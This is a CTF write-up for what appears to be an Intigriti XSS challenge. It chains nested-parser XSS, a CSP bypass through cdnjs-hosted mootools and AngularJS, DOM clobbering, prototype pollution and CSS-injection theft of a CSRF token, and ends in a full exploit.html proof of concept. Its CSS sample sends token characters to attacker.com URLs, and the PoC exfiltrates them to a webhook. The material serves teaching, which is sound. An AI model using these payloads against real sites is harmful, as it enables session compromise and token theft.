# Challenge
![](https://i.imgur.com/rXYZuMY.png)

## XSS Sink

In `preview.php` there are two interesting parameters that can be manipulated to achieve xss:

```php
$name = htmlspecialchars($name);
$desc = htmlspecialchars($desc);

$desc = preg_replace('/(https?:\/\/www\.youtube\.com\/embed\/[^\s]*)/', '<iframe src="$1"></iframe>', $desc);

$desc = preg_replace('/(https?:\/\/[^\s]*\.(png|jpg|gif))/', '<img src="$1">', $desc);
```
At first glance it might seem like a dead end as `htmlspecialchars()` is used on the parameters, so every special character will be converted to HTML entities and xss won't be possible.

If you look carefully the variable `desc` goes through two different regular expressions, because there are two regex, one in charge to put links inside an iframe, and the other one in charge to put png,jgp and gif stuff inside an `img` tag , all of this  after `htmlspecialchars()` is performed.

### Nested conditions
Nested condition is when one payload is processed by two different parsers, which, with some manipulations, will make the parser return broken HTML code with our user input migrating from an HTML attribute value to an HTML attribute name.

Let's make an example:
If we use `https://www.youtube.com/embed/test.jpg` as an input, after the first replacement, it becomes:
```js 
<iframe src="https://www.youtube.com/embed/test.jpg"></iframe>
```
The link ends with `.jpg` so after it goes through the second regex, this is the final result:
``` html
<iframe src="<img src="https://www.youtube.com/embed/test.jpg">"></iframe>
```
Thanks to the nested conditions, our link is first of all incorporated inside and iframe tag, and after is incorporated inside and img tag too.
Now the double quote of the `src` attribute have been closed, now we can inject a new attribute that can specifies HTML content that will be shown in the inline frame, like `srcdoc`, in order to put some malicious HTML content.

It works because even if `htmlspecialchars` will perform the encoding, the context is going to change, now our HTML malicious code is the content of the attribute, and  in the HTML context the attribute content will be decoded and our payload executed.
```html
https://www.youtube.com/embed/srcdoc=<h1>test</h1>.jpg
```
![](https://i.imgur.com/Y5ChAJT.png)

We still can't perform XSS because there is a CSP to bypass.

## CSP Bypass
Below you can find the rules of the CSP:

```php
<?php
  header("Content-Security-Policy: ".
      "default-src 'self'; " .
      "img-src http: https:; " .
      "style-src 'unsafe-inline' http: https:; " .
      "object-src 'none';" .
      "base-uri 'none';" .
      "font-src http: https:;".
      "frame-src https://www.youtube.com/;".
      "script-src 'self' https://cdnjs.cloudflare.com/ajax/libs/;");
?>
```
Here the csp bypass should be clear, `https://cdnjs.cloudflare.com/ajax/libs` is inside the allow-list, so we can use the some angular gadget in order to execute Javascript.
There is a very well-know gadget that is used in almost every CTF (doesn't require user-interaction) when it comes to this types of challenges:
```js
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
  {{$on.curry.call().alert(1)}}
</div>
```
But in this challenge it won't work, we blocked this gadget with the following lines of codes (we alse did some other checks to be sure that couldn't  be possible to bypass this blacklist):

```php
$dangerous_words = ['eval', 'setTimeout', 'setInterval', 'Function', 'constructor', 'proto', 'on', '%', '&', '#', '?', '\\'];

foreach ($dangerous_words as $word) {
  if (stripos($desc, $word) !== false){
    header("Location: app.php#msg=dangerous word detected!");
    die();
  }
}
```
It means that the player needs to find a new gadget, but before let's see why `prototype.js` was needed, in this way we can understand how to find a new gadget.
prototype.js is needed because it adds a few methods to the prototype, like the following one:

```js
function curry() {
  if (!arguments.length) return this;
  var __method = this, args = slice.call(arguments, 0);
  return function() {
    var a = merge(args, arguments);
    return __method.apply(this, a);
  }
}
```
From `if (!arguments.length) return this;` we know that if we perform `function.call()` without providing an argument, it will return `this`, which in this context is going to be `window` in non-strict mode, (in javascript `window` is the global object.)
It works because if `call()`, which is built-in method, <strong>is performed withouth an argument and the function is not in strict mode, null and undefined will be replaced with the global object.</strong>

For example, if we perform obj.hello.call(undefined) the function is going to return `window`.
It is also worth to say that the Angular Sandbox won't let you access directly the `window` object, so we need to access the protoype, and then from the prototype we need to find a function that can return the `window` object.
This is a difficult concept to explain if you are not familiar with javascript, here you can find the documentation about this behavior:
https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/call

Now that we know understand this concept we also understand why protoype.js was usefull , it was useful because`any_function.curry.call()` will return `window` in non-strict mode,  and if we have access to the global object we can bypass the Angular sandbox.

For this challenge we decided to use `mootols` library, with a script to check all the methods added to the prototype that return `window` after the library is loaded:

```html
<!DOCTYPE html>

<html lang="en">
<head>
  <meta charset="utf-8">
  <!-- get the prototype before the library is loaded -->
  <script>
    function getPrototypeFunctions(prototype) {
      return Object.getOwnPropertyNames(prototype)
    }
    var protos = {
      array: getPrototypeFunctions(Array.prototype),
      string: getPrototypeFunctions(String.prototype),
      number: getPrototypeFunctions(Number.prototype),
      object: getPrototypeFunctions(Object.prototype),
      function: getPrototypeFunctions(Function.prototype)
    }
  </script>
</head>
<body>
 <!-- load the library -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
  <!-- get the prototype after the library is loaded -->
  <script>

    var newProtos = {
      array: getPrototypeFunctions(Array.prototype),
      string: getPrototypeFunctions(String.prototype),
      number: getPrototypeFunctions(Number.prototype),
      object: getPrototypeFunctions(Object.prototype),
      function: getPrototypeFunctions(Function.prototype)
    }

    let result = {
      prototypeFunctions: [],
      functionsReturnWindow: []
    }

    function check() {
      checkPrototype('array', 'Array.prototype', Array.prototype)
      checkPrototype('string', 'String.prototype', String.prototype)
      checkPrototype('number', 'Number.prototype', Number.prototype)
      checkPrototype('object', 'Object.prototype', Object.prototype)
      checkPrototype('function', 'Function.prototype', Function.prototype)

      return result
    }

    function checkPrototype(name, prototypeName, prototype) {
      const oldFuncs = protos[name]
      const newFuncs = newProtos[name]
      for(let fnName of newFuncs) {
        if (!oldFuncs.includes(fnName)) {
          const fullName = prototypeName + '.' + fnName
          result.prototypeFunctions.push(fullName)
          try {
            //check if the function return window 
            if (prototype[fnName].call() === window) {
              result.functionsReturnWindow.push(fullName)
            }
          } catch(err) {

          }
        }
      }
    }

    console.log(check())
  </script>
</body>

</html>
```
Result:

![](https://i.imgur.com/wS1Tecm.png)

Now we can use this gadget to achieve XSS:
```js
<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
  {{[].empty.call().alert([].empty.call().document.domain)}}
</div>
```

This is the final payload to execute XSS on the page:

```
https://www.youtube.com/embed/srcdoc=<script/src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script><script/src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script><div/ng-app/ng-csp>{{[].empty.call().alert([].empty.call().document.domain)}}</div>.png
```

But this is not the end of the challenge because this is considered a Self-XSS and it is not allowed, in order to weaponize this type of attack we need to chain it with a CSRF attack.

## CSRF Token leak via XS-Leak
The CSRF token is successfully validated server-side, but if we find a way to Inject CSS then we can use the CSS Injection to exfiltrare the CSRF Token.
We can find the CSRF token two times inside the file `app.php`:
```html
<head>
    <meta name="csrf-token" content="<?= $csrf_token ?>"> 
</head>
```
And:
```html
<div>
  <input type="hidden" name="csrf-token" value="<?= $csrf_token ?>" />
</div>
```


CSS injection token exfiltration technique relies on a feature of CSS called Attribute Selectors. Attribute selectors allow a developer to specify that a particular style should only apply to an element if an attribute of that element meets the condition indicated by the selector, it means we can set-up a `cssInjectionServerUrl` that performs the following logic:

```css
<style>
  head, meta[name=csrf-token] {
    display: block;
  }
input[name=csrf-token][value^=a]{
    background-image: url(https://attacker.com/exfil/a);
}
input[name=csrf-token][value^=b]{
    background-image: url(https://attacker.com/exfil/b);
}
input[name=csrf-token][value^=c]{
    background-image: url(https://attacker.com/exfil/c);   
}
</style>
```
In this example we are telling to the browser that “if the CSRF token starts with an `a` then set the background-image to be the image found at `https://attacker.com/exfil/a`. Then we repeat this rule for every possible character.

```
head, meta[name=csrf-token] {
    display: block;
  }

```
This part is also very useful, we need this piece of code because the CSRF Token needs to be leaked from `<meta>` tag, `display: block;` is in charge to make HTML tags that are normally hidden to be rendered, in this way the css exploit can be applied to our `<meta>` tag too (because `<meta>` is inside the `<head>` tag, so without this last piece of code the CSS exploit is not going to apply on the csrf token).
We can't exfiltrate the CRSF Token from the `<input>` tag because it is hidden and it is also inside the `<div>` tag.

Actually we can inject some CSS inide the msg parameter that is reachable in the  route `/app.php#msg=`

After that our `cssInjectionServerUrl` has been set, we can insert the following code inside the`msg` parameter:
```css
<style>
          @import url('${cssInjectionServerUrl}/start?id=${id}&len=csrf-token-length')
</style>`
```
We can't perform XSS here because the `msg` parameter is filtered out by the last version of DomPurify ( as you can see from the code below), but `<style>` is not consider harmful and it’s allowed by default in DOMPurify.

```js
function showMessage(message, options) {
  const getTimeout = options.timeout || (() => 1000)
  const container = options.container || document.querySelector('body')

  const modal = document.createElement('div')
  modal.id = 'messageModal'
  modal.innerHTML = DOMPurify.sanitize(message)
  container.appendChild(modal)
  history.replaceState(null, null, ' ')

  setTimeout(() => {
    container.removeChild(modal)
  }, getTimeout())
}
```


There is another problem now, our injected element will be removed after  `timeout` is called, the default timeout is `600ms` as you can see in  following code:

```js
function start() {
  const message = decodeURIComponent(location.hash.replace('#msg=', ''))
  if (!message.length) return
  const options = {}
  if (document.domain.match(/testing/)) {
    options['production'] = false
  } else {
    options['production'] = true
    options['timeout'] = () => Math.random()*300 + 300
  }
  showMessage(message, {
    container: document.querySelector('body'),
    ...options
  })
}
```
We can’t steal all the 32-characters of the CSRF token in 600ms, unless we find a way to increase the timeout.

In fact if you have played our challenge you will have noticed that the message in which it is possible to insert CSS code disappears very quickly, as shown by the code before.

Now, look at the following code carefully:

```js
if (document.domain.match(/testing/)) {
  options['production'] = false
} else {
  options['production'] = true
  options['timeout'] = () => Math.random()*300 + 300
}
```
If the condition `if(document.domain.match(/testing/))` is false, the timeout will be set and it cannot be changed. If the condition is true the timeout won't be set, so if we find a prototype pollution then we can pollute Object.prototype.timeout to manipulate the timeout.

How can we make this condition true?

## DOM Clobbering

I think everyone knows how to clobber `window` properties, if you don't you can learn it here: https://portswigger.net/web-security/dom-based/dom-clobbering.

With DOM Clobbering is also possible to clobber `document` properties with some tags, like the `<img>` tag, let's make an example:

![](https://i.imgur.com/3Nn3xJp.png)

You can see how `document.URL` is returning a string with the url of the page, but after I put `<img name=URL>` the img element will be returned instaed of the string, let's make another example:

![](https://i.imgur.com/SgBmupO.png)

As you can see in this screenshot, if we have an img tag on the page with the name attribute set to “try”, “document.try” now refers to this HTML element.
As you might now have guessed, we can use this technique to override the “document.domain” variable with an HTML element.

in `app.php` there is also a vulnerability in the following lines of code:

```html
<input id="nameField" type="text" name="name" value="<?= $_SESSION['name']; ?>" maxlength="20">
```
Here there is a clear HTML Injection inside the name field, but it is not possible to achieve XSS from this injection point because there is a length check for this parameter:


```php
if (strlen($name) >= 20) {
  die('name too long');
}
```
Given the strict CSP is not possible to execute XSS with less that 20 characters, but we can inject `"><img name=domain>` inside the name field, now `document.domain` is a HTML element so it will be also a DOM element, it means that `document.domain.match` will throw an error because there will be no `match` method in DOM after the DOM Clobbering is performed.

In JavaScript, when a given method is <strong>not found</strong>, the JS engine will keep looking one level up to check it’s prototype until the prototype is `null`, it mean that if we have a protoype pollution we can pollute `Object.prototype.match`.

## Prototype Pollution

JavaScript is a prototype-based object-oriented programming language. Each object is linked to a “prototype”. for example. if we invoke the `toString` method on an object, JavaScript will first check to see if we explicitly defined the method for the given object. If we haven’t, it will look for its definition on the object’s prototype, but what if we find a way to insert our malicious content inside the Object prototype ?

There is a Prototype Pollution inside `initTheme`:

```js
function initTheme() {
  if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
    isDarkMode = true
  }

  fetch("theme.php")
    .then((res) => res.json())
    .then((serverTheme) => {
      theme = {
        primary: {},
        secondary: {}
      }

      // look carefully at the following loop
      for(let themeName in serverTheme) {
        const currentTheme = theme[themeName]
        const currentServerTheme = serverTheme[themeName]

        for(let item in currentServerTheme) {
          currentTheme[item] = () => isDarkMode ? currentServerTheme[item].dark : currentServerTheme[item].light
        }
      }

      const themeDiv = document.querySelector('.theme-text')
      themeDiv.innerText = `Primary - Text: ${theme?.primary?.text()}, Background: ${theme?.primary?.bg()}
        Secondary - Text: ${theme?.secondary?.text()}, Background: ${theme?.secondary?.bg()}
      `
      start()
    })
}

```
This type of vulnerability is often associated with operations such as `merge()`, `clone()` ecc ecc..., or when a query string is parsed.
In fact there is another pattern that can lead to prototype pollution, if `obj[a][b]=value` is present it can be vulnerable if you can control both `a` and `value`, as an attacker we can set `a` to `__proto__` and the property with the name defined by `b` will be defined on all existing objects of the application with the value defined by `value`.
Ehi, we can find this pattern inside the loop in the code above!

`initTheme` is in charge to update the themes, so in order to exploit this vulnerability we can update a theme from the website and provide the following content:

```json
{
  "__proto__":{
    "timeout":{
      "dark":"99999","light":"99999"
    },
    "match":{
      "dark":"1", "light":"1"
    }
  }
}
```

After the theme is loaded, `Object.prototype.match` will return 1 which means true, so after the DOM Clobbering is performed and javascript will look into the prototype, it will find out that `Object.prototype.timeout` will be true, in this way `document.domain.match(/testing/)` will not be false anymore.

Now that the condition is true, we also polluted `Object.prototype.timeout` , it will become a function that always returns "99999", in this way we have more time to perform our CSS Injection to exfiltrare the CSRF token and not 600ms anymore.

## Summary:

1. Log-in with the name `"><img name=domain>` to perform DOM clobbering in order to make the JS engine look into the proto chain.
2. Update theme and perform prototype pollution in order to make `Object.prototype.match` true and manipulate `Object.prototype.timeout`
3. Exiltrate the CSRF token via CSS injection
4. Execute the CSRF attack in order to submit the payload with nested conditions XSS + CSP bypass. 

## Final PoC:
Let's prepare `exploit.html`:

```html
<html>
<head>
    <script>
        const URL = 'https://challenge-0822.intigriti.io/challenge';
        const webhook = location.host;
        // prepare the id
        const ID = Math.floor(Math.random() * Math.pow(2, 32)).toString(16).padStart(8, '0');

        const sleep = (ms) => new Promise(r => setTimeout(r, ms));
        let w;

        function login(name) {
            let route = URL + '/login.php?name=';
            route += encodeURIComponent(name);
            w = window.open(route, 'window');
            return w;
        }
    // perform the proto pollution
        async function prototype_pollution() {
            w.location.href = '/empty';
            await sleep(2000);
            w.document.body.innerHTML = `
            <form id=f action="https://challenge-0822.intigriti.io/challenge/theme.php" method="POST" enctype="text/plain">
                <input id=i type="hidden" name='' value='' />
            </form>
            `;
            w.i.name = `
            {
                "primary": {
                    "text": {
                        "dark": "#1337",
                        "light": "#1337"
                    },
                    "bg": {
                        "dark": "#1337",
                        "light": "#1337"
                    }
                },
                "__proto__":{
                    "timeout":{
                        "dark":99999,
                        "light":99999
                    },
                    "match":{
                        "dark":1,
                        "light":1
                    }
                },
                "secondary": {
                    "text": {
                        "dark": "#1337",
                        "light": "#1337"
                    },
                    "bg": {
                        "dark": "#1337",
                        "light": "#1337"
                    },
                    "x":"
            `.replace(/\s/g, '')
            w.i.value = '"}}';
            w.f.submit();
            return w;
        }

        async function xss(token){
            w.location.href = '/empty';
            await sleep(2000);
            w.document.body.innerHTML = `
            <form id=f action="https://challenge-0822.intigriti.io/challenge/preview.php" method="POST">
                <input id=c type="hidden" name="csrf-token" value="" />
                <input id=n type="hidden" name="name" value="" />
                <input id=d type="hidden" name="desc" value="" />
            </form>
            `;
            w.c.value = token;
            w.n.value = 'test';
            w.d.value = `
            https://www.youtube.com/embed/srcdoc=<script/src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"><\/script><script/src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"><\/script><div/ng-app/ng-csp>{{[].empty.call().alert([].empty.call().document.domain)}}</div>.jpg
            `;
            await sleep(1000);
            w.f.submit();
        }

        function leak_csrf_token() {
            console.log("leak");
            let css_payload = `@import url("https://${webhook}/css?i=${ID}");\n`;
            for (let i = 1; i < 40; ++i) {
                css_payload += `@import url("https://${webhook}/css?i=${ID}&t=${i + 0.6}");\n`;
            }
            let url = URL + '/app.php#msg=' + encodeURIComponent(
                        \x3ch1>Wait \x3c/h1>
                        \x3cstyle>
                                    head, meta{display:block}
                        \x3c/style>
                        \x3cstyle>
                            ${css_payload}	
                        \x3c/style>
                        `
            );
            w.location = url;
            console.log(url);
            let check_interval_id = setInterval(() => {
                fetch(`/now_token?i=${ID}`).then(
                    r => r.text()
                ).then(
                    token => {
                        document.getElementById('token').innerText = `Now Token: ${token}`;
                        if (token.length >= 32) {
                            clearInterval(check_interval_id);
                            console.log(token);
                            xss(token); 
                        }
                    }
                );
            }, 5500);
        }

        function exploit() {
            login(`"><img name=domain `);
            setTimeout(() => {
                prototype_pollution();
                setTimeout(() => {
                    leak_csrf_token();
                }, 4000);
            }, 3000);
        }
    </script>
</head>

<body>
    <h1 id="token">Token: </h1>
    <button onclick="exploit()">Exploit</button>
</body>
</html>
```
Just as reminder, there will be a server specified inside `webhook` that is going to perform this code:`[name=csrf-token][content^="%s"]{background-image: url("%s");}` in order to bruteforce the token.
You should also read this article to understand the difference between chrome and firefox when it comes to XS-Leak via CSS Injection: https://research.securitum.com/css-data-exfiltration-in-firefox-via-single-injection-point/

## Thanks
I would like to thank Huli very much for creating this challenge with me, also, Kudos to Igor for his research about the nested conditions and Strellic for teaching me a lot with his challenges.
I am going to link every study material from which we took inspiration and which you can read to learn the basics of some attacks used in this challenge :

#### Nested Condition Research:
https://swarm.ptsecurity.com/fuzzing-for-xss-via-nested-parsers-condition/#:~:text=Nested%20condition%20is%20when%20one,both%20by%20developers%20and%20hackers. 

#### XS-Leak via CSS Injection material:
https://xsleaks.dev/docs/attacks/css-injection/ 
https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d 
https://x-c3ll.github.io/posts/CSS-Injection-Primitives/

#### Dom Clobbering Material:
https://portswigger.net/web-security/dom-based/dom-clobbering
https://brycec.me/posts/htb_unictf_analytical_engine
https://terjanq.medium.com/dom-clobbering-techniques-8443547ebe94

#### Prototype Pollution Material:
https://blog.s1r1us.ninja/research/PP
https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications
https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/

To conclude, I hope you enjoyed the challenge and learned something new :D, see you at the next challenge. Ciaooooo ![](https://i.imgur.com/YIgjfY6.gif)

